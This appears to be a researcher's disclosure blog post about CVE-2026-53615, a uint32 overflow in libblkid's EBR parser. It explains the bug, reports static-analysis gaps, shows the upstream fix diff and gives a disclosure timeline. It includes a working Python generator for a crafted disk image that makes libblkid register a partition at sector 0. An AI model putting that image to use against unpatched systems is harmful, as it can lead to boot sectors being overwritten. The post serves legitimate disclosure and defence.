#
---
title: "CVE-2026-53615: Integer Overflow in libblkid Exposes the MBR to the Partition Parser"
translationKey: "libblkid"
date: 2026-06-17
author: "Michele Piccinni aka RZP"
tags: ["privilege-escalation", "vulnerability-research", "responsible-disclosure", "linux", "cybersecurity", "hacking", "threatintelligence", "artificialintelligence"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Independent security research identifying 1 CVE in *util-linux libblkid"
draft: false
---

**Reading time:** 15 minutes

---
![Libblkid article cover](/images/util-linux/libblkid.png)

## TL;DR

A `uint32_t` integer overflow in `parse_dos_extended()` — the EBR (Extended
Boot Record) parser inside **libblkid** — allows a crafted disk image or USB
stick to trick the library into registering a partition at **sector 0 (the MBR)**.
Any tool that invokes libblkid on attacker-supplied media, including **udisks2
running as root**, will silently process boot sector bytes as valid partition
data. If `mkfs` is subsequently invoked, the MBR is destroyed.

- **CVE**: CVE-2026-53615  
- ** Security Advisory [GHSA-h4rw-gv36-wmp5](https://github.com/util-linux/util-linux/security/advisories/GHSA-h4rw-gv36-wmp5)**
- **CVSS**: 8.0 HIGH (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H`)  
- **CWE**: CWE-190 — Integer Overflow or Wraparound  
- **Affected versions**: util-linux ≤ 2.41, confirmed on Ubuntu 24.04 LTS
  (2.39.1), Debian Trixie (2.42\~rc1), AlmaLinux 9 / RHEL 9 (2.37.4)  
- **Fix**: Comprehensive fix by Karel Zak — 64-bit arithmetic + unified EBR bounds check - 2.42
  + chain validation — upstream commits [05c2dba](https://github.com/util-linux/util-linux/commit/a2d858176b609ab5b8535021a3af9cd302d23d31) - [a2d8581](https://github.com/util-linux/util-linux/commit/05c2dbadf34cc74192287f377904afaaf4061623)

---

## Background: What Is libblkid?

`libblkid` is the partition and filesystem probing library at the heart of the
Linux storage stack. It is the component that answers the question *"what is on
this block device?"* — and it is called everywhere:

```
USB insertion → udev → udisks2 → libblkid → "it has an ext4 partition"
                                              ↓
                                     automount / mkfs / fsck
```

Every time Linux processes a new disk — from inserting a USB stick to analyzing
a VM disk image — libblkid reads partition tables and registers what it finds.
The vulnerability resides in the Extended Boot Record (EBR) parser, used for
MBR partition schemes with more than 4 partitions.

---

## The Vulnerable Code

`libblkid/src/partitions/dos.c`, function `parse_dos_extended()`. This function
is called for every extended partition in an MBR layout, walking the chain of
EBRs that describe logical partitions (partitions 5+).

```c
static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                               uint32_t ex_start, uint32_t ex_size,
                               uint32_t cur_start, uint32_t cur_size)
{
    /* ... */
    for (p = p0, i = 0; i < 4; i++, p++) {
        uint32_t abs_start;
        blkid_partition par;

        start = dos_partition_get_start(p) * ssf;   /* (1) from disk */
        size  = dos_partition_get_size(p)  * ssf;

        abs_start = cur_start + start;              /* (2) LINE 96 — NO GUARD */

        if (!size || is_extended(p))
            continue;
        if (i >= 2) {                               /* (3) guard ONLY for i≥2 */
            if (start + size > cur_size) continue;
            if (abs_start < ex_start)   continue;
            if (abs_start + size > ex_start + ex_size) continue;
        }

        if (blkid_partlist_get_partition_by_start(ls, abs_start))
            continue;

        par = blkid_partlist_add_partition(ls, tab, abs_start, size); /* SINK */
```

Three observations from reading the code:

**①** `dos_partition_get_start(p)` reads a 32-bit little-endian value directly
from the disk buffer — fully attacker-controlled.

**②** `abs_start = cur_start + start` is an unchecked `uint32_t` addition. In C,
unsigned integer arithmetic is modulo 2³², so if the sum exceeds 0xFFFFFFFF it
wraps silently — no exception, no warning, no UB.

**③** The `if (i >= 2)` block contains bounds checks that would have caught this
— but they only apply to the *third and fourth* EBR entries. The first two entries
(the data partition and the next-EBR pointer) are processed without any validation.

---

## The Math

Setting `cur_start = 2` (the EBR sector, a common legitimate value) and crafting
the first EBR entry with `lba_start = 0xFFFFFFFE`:

```
abs_start = (uint32_t)(cur_start + start)
          = (uint32_t)(2 + 0xFFFFFFFE)
          = (uint32_t)(0x100000000)    ← exceeds uint32 range
          = 0x00000000                 ← wraps to MBR sector 0
```

The value `0x00000000` is passed to `blkid_partlist_add_partition()` as the
partition start. libblkid now believes there is a 128 KB partition beginning at
the very first sector of the disk — the MBR.

---

## Crafting the Image

The crafted disk image is a 4 KB file. The MBR at offset 0 contains a standard
extended partition entry pointing to sector 2. The EBR at sector 2 contains a
partition entry with `lba_start = 0xFFFFFFFE` and `lba_size = 0x100`.

```python
import struct, sys

def write_le32(val):
    return struct.pack('<I', val & 0xFFFFFFFF)

def mbr_entry(ptype, start, size):
    # CHS (ignored) + type + CHS + LBA start + LBA size
    return b'\xFE\xFF\xFF' + bytes([ptype]) + b'\xFE\xFF\xFF' + \
           write_le32(start) + write_le32(size)

img = bytearray(4096)   # 8 sectors × 512 bytes

# MBR: one extended partition (type 0x05) starting at sector 2
img[446:462] = mbr_entry(0x05, 2, 0xFFFFFFFB)
img[510] = 0x55
img[511] = 0xAA

# EBR at sector 2: data partition with lba_start = 0xFFFFFFFE (overflow trigger)
ebr_base = 2 * 512
img[ebr_base + 446 : ebr_base + 462] = mbr_entry(0x83, 0xFFFFFFFE, 0x100)
img[ebr_base + 510] = 0x55
img[ebr_base + 511] = 0xAA

with open('crafted_overflow.img', 'wb') as f:
    f.write(img)
```

---

## Reproduction

On Ubuntu 24.04 LTS (util-linux 2.39.3 — vanilla install, no patches):

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
 5     0        255        256 128K
```

**Partition 5 with START=0** is the overflow result. A legitimate disk image
never produces a partition at sector 0. The clean reference image:

```bash
$ partx --show crafted_clean.img
NR START  END SECTORS   SIZE NAME UUID
 1     1 2048    2048     1M
 2  2049 4096    2048     1M
 5  2050 3073    1024   512K
 6  3076 4096    1021 510.5K
```

All partitions start at expected sectors, well above 0.

---

## Why Static Analysis Missed It

This is the analytically most interesting part of the finding.

**GCC `-fanalyzer` — CLEAN.** The C standard (ISO/IEC 9899:2018 §6.2.5) mandates
that unsigned integer arithmetic is *defined* modulo 2^N. There is no undefined
behaviour — the wraparound is perfectly legal C. GCC's static analyzer focuses
on code paths that produce UB, so it generates no warning. This explains why the
bug passed the project's CI pipeline.

**GCC UBSan — NO TRAP.** Same reason: `-fsanitize=undefined` instruments for
signed integer overflow (which is UB) but not unsigned. The flag
`-fsanitize=unsigned-integer-overflow` exists only in Clang.

**Coverity Scan — would have flagged INTEGER_OVERFLOW (High).** Coverity has a
dedicated checker that tracks unsigned arithmetic producing values outside the
expected semantic range, even when the operation is technically defined. It maps
this to CWE-190 and flags the taint path from disk → `lba_start` → `abs_start`
→ `add_partition()` as TAINTED_DATA (High).

**Clang `alpha.security.taint` — would have triggered.** This checker propagates
a taint marker from data read out of the disk buffer and reports when tainted
values flow into security-critical sinks without sanitization.

**Lesson:** A class of semantic integer overflows — where unsigned wraparound
is *defined* but produces a *wrong* security-critical value — is invisible to
standard GCC CI pipelines. This gap is non-trivial and deserves to be called out
in any disclosure.

---

## SAST / DAST Results Table

| Tool | Result | Notes |
|------|--------|-------|
| GCC -Wall -Wextra | CLEAN | No overflow warning |
| GCC -Wconversion | 10 warnings | sign-conversion on `uint32←int` multiplications (dos.c:94-95), not the overflow itself |
| GCC -fanalyzer | **CLEAN** | **Gap** — unsigned wrap is defined C; no CWE generated |
| Clang alpha.security.taint | TRIGGERED | Taint path: disk → lba_start → abs_start → sink |
| Coverity INTEGER_OVERFLOW | HIGH | dos.c:96 |
| Coverity TAINTED_DATA | HIGH | End-to-end path confirmed |
| ASan (standalone harness) | TRIGGERED | 5/5 test cases: i=0, i=1, boundary |
| ASan (real libblkid.so 2.42-rc1) | TRIGGERED | Sector 0 registration confirmed |
| UBSan GCC | **NO TRAP** | **Gap** — unsigned overflow is not UB in C |
| Runtime partx/blkid | TRIGGERED | Ubuntu 24.04 LTS production system |

---

## Downstream Impact

When libblkid registers `abs_start = 0`, every consumer sees a "partition"
starting at the first byte of the disk:

| Consumer | What happens |
|----------|-------------|
| **udisks2** | Mounts the "partition" (128 KB at offset 0) as a filesystem — exposes the boot sector and partition table as readable bytes |
| **blkid** | Reports a partition at sector 0 — confuses backup/restore utilities and partition editors |
| **mkfs** | If invoked automatically (e.g. via udev rules), writes a filesystem superblock at sector 0 — **MBR and partition table are destroyed** |
| **fsck** | Runs filesystem check starting at sector 0 — misinterprets x86 boot code as an ext2 superblock |
| **libguestfs / QEMU** | VM disk inspection is compromised when parsing guest images |

The worst-case scenario is `mkfs` running automatically on newly inserted media
with the crafted EBR. Some desktop configurations (particularly older Ubuntu
setups with automount rules) can reach this path without user interaction beyond
inserting the USB stick.

---

## The Fix

When reporting the vulnerability, I proposed a minimal 3-line guard using safe
subtraction to pre-check the overflow:

```c
if (start > UINT32_MAX - cur_start) {
    DBG(LOWPROBE, ul_debug("#%d: EBR start overflow -- ignore", i + 1));
    continue;
}
```

Upstream maintainer Karel Zak accepted the report but implemented a
**significantly more robust fix** that addresses the root cause more completely.
His analysis correctly identified that the problem was not just the arithmetic
overflow, but the complete absence of proper bounds validation for EBR entries —
the code was weak in not ensuring that EBR data stayed within the master
extended partition area.

The upstream fix (signed off by Karel Zak, `Reported-by: Michele Piccinni`)
addresses three distinct issues:

---

### Fix ① — 64-bit arithmetic eliminates wraparound at the root

Instead of a preventive guard, the addition is promoted to `uint64_t`, making
overflow physically impossible:

```c
uint64_t ex_end = (uint64_t) ex_start + ex_size;  /* new: area boundary */
...
uint64_t abs = (uint64_t) cur_start + start;       /* new: 64-bit addition */
abs_start = (uint32_t) abs;                        /* safe cast after validation */
```

`(uint64_t)(2 + 0xFFFFFFFE) = 0x100000000` — no wraparound. The value is then
validated before being truncated back to `uint32_t`.

---

### Fix ② — Unified bounds check for ALL EBR entries

The original code applied bounds checks only for loop indices `i >= 2`. Entries
`i=0` and `i=1` were processed without any validation. The fix applies a single
bounds check to **all four entries** uniformly:

```c
/* data partition must be within the extended area — for ALL i */
if (abs < ex_start || abs + size > ex_end) {
    DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
        "extended -- ignore", i + 1));
    continue;
}
```

This is the architecturally correct solution: any EBR data partition, by
definition, must reside within the master extended partition boundaries. The
previous `i >= 2` distinction was logically unjustified.

---

### Fix ③ — EBR chain validation

The fix also hardens EBR chain traversal (the next-EBR pointer processing),
preventing backward links and out-of-bounds navigation:

```c
uint64_t next = (uint64_t) ex_start + start;

if (next + size > ex_end) {
    DBG(LOWPROBE, ul_debug("EBR link outside extended area -- leave"));
    goto leave;
}
if (next <= cur_start) {
    DBG(LOWPROBE, ul_debug("EBR link does not advance -- leave"));
    goto leave;
}
cur_start = (uint32_t) next;
```

This prevents an attacker from crafting an EBR chain that loops backward or
jumps outside the extended partition area — closing a related class of potential
abuse that was not part of the original report.

---

### The complete diff

```diff
--- a/libblkid/src/partitions/dos.c
+++ b/libblkid/src/partitions/dos.c
@@ -46,6 +46,7 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
 {
        blkid_partlist ls = blkid_probe_get_partlist(pr);
        uint32_t cur_start = ex_start, cur_size = ex_size;
+       uint64_t ex_end = (uint64_t) ex_start + ex_size;
        const unsigned char *data;
        int ct_nodata = 0;
        int i;
@@ -88,24 +89,31 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                for (p = p0, i = 0; i < 4; i++, p++) {
                        uint32_t abs_start;
+                       uint64_t abs;
                        blkid_partition par;

                        start = dos_partition_get_start(p) * ssf;
                        size = dos_partition_get_size(p) * ssf;
-                       abs_start = cur_start + start;  /* absolute start */

                        if (!size || is_extended(p))
                                continue;
+
+                       abs = (uint64_t) cur_start + start;
+
+                       /* data partition must be within the extended area */
+                       if (abs < ex_start || abs + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
+                                       "extended -- ignore", i + 1));
+                               continue;
+                       }
+                       abs_start = (uint32_t) abs;
+
                        if (i >= 2) {
                                if (start + size > cur_size)
                                        continue;
-                               if (abs_start < ex_start)
-                                       continue;
-                               if (abs_start + size > ex_start + ex_size)
-                                       continue;
                        }
@@ -142,8 +150,22 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                if (i == 4)
                        goto leave;

-               cur_start = ex_start + start;
-               cur_size = size;
+               {
+                       uint64_t next = (uint64_t) ex_start + start;
+
+                       if (next + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("EBR link outside "
+                                       "extended area -- leave"));
+                               goto leave;
+                       }
+                       if (next <= cur_start) {
+                               DBG(LOWPROBE, ul_debug("EBR link does not "
+                                       "advance -- leave"));
+                               goto leave;
+                       }
+                       cur_start = (uint32_t) next;
+                       cur_size = size;
+               }
        }
 leave:
        return BLKID_PROBE_OK;
```

After the fix:

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
# Partition 5 — not registered. Out-of-bounds entry rejected.
```

---

## The Upstream Maintainer's Perspective

Karel Zak initially assessed the vulnerability as "not very security-sensitive",
noting that libblkid output is a userspace hint and is not directly consumed by
the kernel for partition mapping. This is a technically correct observation for
isolated server environments.

The more concerning attack chain — udisks2 running as root on a desktop system,
automatically processing removable media and potentially triggering mkfs on the
reported partition — was the key argument for a higher severity rating. Karel
acknowledged this scenario and implemented the comprehensive fix described above,
which goes well beyond the scope of the original report.

This is a good example of how responsible disclosure benefits both parties: the
researcher surfaces the vulnerability with a minimal PoC, and the maintainer —
who has deeper context on the codebase — implements an architecturally sounder
solution. The final fix is strictly better than what I originally proposed.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 25-Mar-2026 | Vulnerability identified — SAST + manual code review of 2.42-rc1 |
| 25-Mar-2026 | Confirmed live on Ubuntu 24.04 (2.39.3), AlmaLinux 9 (2.37.4), Debian 2.42\~rc1-2 |
| 25-Mar-2026 | Upstream disclosure → Karel Zak (kzak@redhat.com) + CVE request → Red Hat CNA (secalert@redhat.com) in Cc |
| 26-Mar-2026 | Karel Zak responds, plans fix in v2.42 (~Mar 31) and backport v2.41.4. Chooses public release with fix (no embargo) |
| 26-Mar-2026 | Karel Zak provides comprehensive fix — 64-bit arithmetic + unified bounds check + EBR chain validation. Commit includes `Reported-by: Michele Piccinni` |
| 26-Mar-2026 | Red Hat Product Security opens CVE evaluation ticket |
| 01-Apr-2026 | Upstream fix merged — v2.42 and v2.41.4 released |
| 09-Jun-2026 | CVE-2026-53615 assigned by GitHub CNA |
| 16-Jun-2026 | Advisory published |
| 17-Jun-2026 | This public disclosure |

---

## Remediation

**Update util-linux** to the fixed version:

```bash
# Ubuntu / Debian
sudo apt update && sudo apt upgrade util-linux

# RHEL / AlmaLinux / Fedora
sudo dnf update util-linux

# Verify (should show the fixed version)
partx --version
```

If you maintain a custom build of util-linux, apply the upstream patch.

```bash
cd util-linux
git cherry-pick [HASH]
./configure --enable-libblkid && make -j$(nproc)
```

---

## Research Methodology

This finding emerged from a structured independent vulnerability research
program focused on critical Linux infrastructure components. The methodology:

1. **SAST pass** — custom Semgrep rules on arithmetic operations involving
   values read from `dos_partition_get_start()` and `dos_partition_get_size()`
2. **Manual code review** — end-to-end reading of `parse_dos_extended()`,
   mapping loop indices with and without bounds checks
3. **Image crafting** — Python generator for all overflow variants (i=0, i=1,
   boundary cases)
4. **Runtime confirmation** — `partx` on a production Ubuntu 24.04 system
   without compilation
5. **Multi-distro validation** — Debian package patch audit, AlmaLinux source
   review
6. **SAST/DAST pipeline** — GCC warnings, `-fanalyzer`, ASan harness, Coverity
   mapping, UBSan analysis and gap documentation

Total time from first reading `dos.c` to a fully reproducible finding: ~6 hours
across two sessions.

---

## Appendix: Why `i=0` and `i=1` Are the Attack Vectors

An EBR contains exactly four 16-byte partition entries at offset 446 (layout
identical to the MBR):

| Entry | Role | Bounds check |
|-------|------|--------------|
| 0 | Data partition (the logical partition) | **None** |
| 1 | Next EBR pointer | **None** |
| 2 | Unused (sometimes mirrors of outer EBR) | `i >= 2` block |
| 3 | Unused | `i >= 2` block |

The MS-DOS and Linux kernel documentation agree that only entries 0 and 1 are
meaningful. The comment in the kernel's own EBR parser notes that OS/2 uses all
four entries, and DRDOS sometimes puts the extended entry first — which is
exactly why the loop goes to `i < 4`. The `i >= 2` guard exists as an additional
sanity check for anomalous cases; it was never intended as a security boundary
for the first two entries.

---

## A 17-Year-Old Vulnerability

One of the most striking aspects of this finding is its **longevity**.

The `dos.c` file containing `parse_dos_extended()` carries this copyright header:

```
Copyright (C) 2009 Karel Zak <kzak@redhat.com>
```

The vulnerable code — the unguarded `uint32_t` addition at line 96 — has been
present **since the file was first written in 2009**, when Karel Zak extended
libblkid to support partition table probing in util-linux-ng 2.17. The
vulnerability survived intact for 17 years across dozens of releases, hundreds
of commits, and an entire generation of distribution updates.

In 2016, CVE-2016-5011 had already brought attention to `parse_dos_extended()`
itself, identifying an infinite loop bug in the very same function. That fix
added a duplicate-check guard (line 112), but did not touch the arithmetic
addition code at line 96. Two distinct bugs, same function, seven years apart.

**Why did it survive so long?**

The answer lies in the nature of the bug itself: `uint32_t` overflow is
**defined behavior in C** (ISO/IEC 9899:2018 §6.2.5). It is not undefined
behaviour, not a compilation error, not a warning with `-Wall` or `-fanalyzer`.
The code is syntactically correct, semantically wrong. Only a taint-aware
checker like Coverity or Clang's `alpha.security.taint` — tools not typically
integrated in open source project CI pipelines — can trace the path from a byte
read off the disk to its use as a critical index without sanitization.

This combination — legacy code, defined-but-semantically-wrong arithmetic, no
taint-aware tooling in CI — is precisely the profile of vulnerabilities that
remain hidden for decades in critical infrastructure components.
